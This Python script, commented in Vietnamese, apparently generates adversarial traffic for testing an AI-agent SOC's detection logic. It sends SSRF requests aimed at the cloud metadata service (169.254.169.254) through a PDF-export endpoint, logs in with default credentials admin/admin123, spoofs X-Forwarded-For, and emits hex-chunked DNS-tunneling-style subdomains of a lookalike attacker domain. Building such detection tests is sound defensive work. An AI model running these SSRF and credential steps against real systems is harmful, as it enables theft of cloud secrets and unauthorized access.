
"""
Phase 2 - Behavioral DNS Telemetry Simulation
- Chuyển đổi chuỗi dữ liệu sang định dạng Hex để tối ưu hóa mật độ phân tán ký tự.
- Triển khai cơ chế tạo tiền tố ngẫu nhiên (Randomized Prefix) cho các truy vấn.
- Giả lập luồng dữ liệu nhật ký thô (Raw Logs) đồng bộ với cấu trúc hệ thống Core DNS.
"""

import requests
import json
import uuid
import time
import random
import sys
import math

# ========== CONFIGURATION ==========
TARGET_HOST = "100.126.121.94"
TARGET_PORT = 8080   # WAF port — kma-app không expose 8000 ra ngoài Docker
USE_HTTPS = False

# Sử dụng tên miền ghép nhiều từ mô phỏng chính xác nhà cung cấp hạ tầng (Infrastructure Vendor)
ATTACKER_DOMAIN = "policy-edge-service.net" 

CORRELATION_ID = str(uuid.uuid4())
SSRF_ENDPOINT = "/api/v1/tools/export-pdf"

# Khởi tạo chuỗi khóa bí mật động (Dynamic) nhằm đảm bảo tính ngẫu nhiên sau mỗi lần thực thi
JWT_SECRET = uuid.uuid4().hex
HEX_SECRET = JWT_SECRET.encode('utf-8').hex()

METADATA_URL = "http://169.254.169.254/latest/meta-data/"

# Danh sách các từ khóa phân vùng hạ tầng hệ thống
PREFIXES = ["sync", "cache", "edge", "node", "api", "cdn", "srv", "status"]

def shannon_entropy(s):
    """Tính toán độ hỗn loạn thông tin (Hàm phục vụ đối soát kiểm tra nội bộ)"""
    if not s:
        return 0
    prob = [float(s.count(c)) / len(s) for c in set(s)]
    return -sum(p * math.log2(p) for p in prob)

def send_ssrf_request(payload_url, tag=""):
    """Gửi yêu cầu kiểm thử thông qua tính năng xuất báo cáo từ xa"""
    headers = {
        "X-Request-ID": f"{CORRELATION_ID}-{tag}",
        "Content-Type": "application/json",
        "X-Forwarded-For": "45.33.32.156"
    }
    if _session_token:
        headers["Authorization"] = f"Bearer {_session_token}"
    data = {"source_url": payload_url}
    url = f"{'https' if USE_HTTPS else 'http'}://{TARGET_HOST}:{TARGET_PORT}{SSRF_ENDPOINT}"
    try:
        r = requests.post(url, headers=headers, json=data, timeout=5)
        print(f"[+] SSRF ({tag}): HTTP {r.status_code}")
        return r
    except Exception as e:
        print(f"[-] Connection error registered ({tag})")
        return None

DNS_ENDPOINT = "/api/v1/tools/dns-query"
# JWT token đăng nhập trước để gọi endpoint (cần auth)
_session_token = None

def login_and_get_token():
    """Đăng nhập lấy token để gọi các endpoint cần auth"""
    global _session_token
    url = f"{'https' if USE_HTTPS else 'http'}://{TARGET_HOST}:{TARGET_PORT}/auth/login"
    try:
        r = requests.post(url, json={"username": "admin", "password": "admin123"}, timeout=5)
        _session_token = r.json().get("access_token")
        print(f"[*] Auth token acquired")
    except Exception:
        print("[-] Could not acquire auth token — DNS logs will be sent unauthenticated")

def _send_dns_log(subdomain, client_ip="172.20.0.3"):
    """Gửi DNS query log vào hệ thống qua DNS resolver endpoint"""
    url = f"{'https' if USE_HTTPS else 'http'}://{TARGET_HOST}:{TARGET_PORT}{DNS_ENDPOINT}"
    headers = {"Content-Type": "application/json", "X-Forwarded-For": "45.33.32.156"}
    if _session_token:
        headers["Authorization"] = f"Bearer {_session_token}"
    payload = {
        "query": subdomain,
        "query_type": "A",
        "client_ip": client_ip,
        "server_id": "dns-internal-core"
    }
    try:
        requests.post(url, headers=headers, json=payload, timeout=3)
        print(f"[+] DNS log sent to system: {subdomain[:60]}...")
    except Exception:
        print(f"[-] DNS log failed: {subdomain[:40]}")

def dns_exfil_burst(data_hex, domain, num_chunks=4):
    """Mô phỏng luồng dữ liệu DNS tunneling — forward vào hệ thống qua DNS resolver endpoint"""
    chunk_size = max(1, len(data_hex) // num_chunks)
    chunks = [data_hex[i:i+chunk_size] for i in range(0, len(data_hex), chunk_size)]

    print(f"[*] Sending DNS exfil stream to internal resolver...")

    for chunk in chunks:
        pfx = random.choice(PREFIXES)
        subdomain = f"{pfx}-{chunk}.{domain}"
        _send_dns_log(subdomain)
        time.sleep(random.uniform(0.1, 0.3))

def generate_dns_volume_anomaly():
    """Tạo cụm truy vấn DNS dồn dập (Volume Burst) — forward vào hệ thống"""
    print("\n[*] Injecting DNS volume anomaly burst...")
    for i in range(8):
        fake_hex = f"73797374656d2d{random.randint(1000,9999)}"
        pfx = random.choice(PREFIXES)
        subdomain = f"{pfx}-{fake_hex}.edge-sync-cdn.net"
        _send_dns_log(subdomain)
        time.sleep(0.04)

def main():
    if len(sys.argv) > 1:
        global TARGET_HOST, TARGET_PORT
        TARGET_HOST = sys.argv[1]
        if len(sys.argv) > 2:
            TARGET_PORT = int(sys.argv[2])
            
    print(f"[*] Base target specified: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Session tracking identifier: {CORRELATION_ID}")

    # Lấy token để gọi các endpoint cần auth
    login_and_get_token()

    # Thực thi chuỗi kịch bản mô phỏng
    send_ssrf_request("http://169.254.169.254/latest/user-data", "metadata-userdata")
    time.sleep(0.5)

    send_ssrf_request(METADATA_URL, "metadata-main")
    time.sleep(0.5)
    
    dns_exfil_burst(HEX_SECRET, ATTACKER_DOMAIN, num_chunks=4)
    generate_dns_volume_anomaly()
    
    print("\n=== ADVERSARIAL TELEMETRY GENERATED ===")
    print("[+] Stream injection completed. Real-time telemetry sent to ingestion pipeline.")
    print("[+] Check your AI Agent SOC dashboard to evaluate detection logic against stealth constraints.")

if __name__ == "__main__":
    main()